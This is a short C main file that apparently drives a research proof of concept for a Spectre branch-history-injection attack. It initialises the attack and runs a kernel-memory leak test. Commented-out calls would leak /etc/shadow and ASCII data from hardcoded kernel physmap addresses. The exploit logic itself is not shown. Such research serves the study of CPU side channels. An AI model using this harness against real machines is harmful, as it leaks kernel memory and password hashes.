#include "pwsc_spectre_bhi.h" 

int main(void) {

    // Init 
    init_pwsc_spectre_bhi(); 

    // Run 
    // pwsc_test(); 
    // leak_etc_shadow(0xffff888470994000UL); // *****Replace with correct with correct physmap address
    // leak_ascii(0xffff88837892c004UL, 300); // *****Replace with correct with correct physmap address
    test_leak_u64(); 
    // paper_stats(); 
    
    return 0; 
}
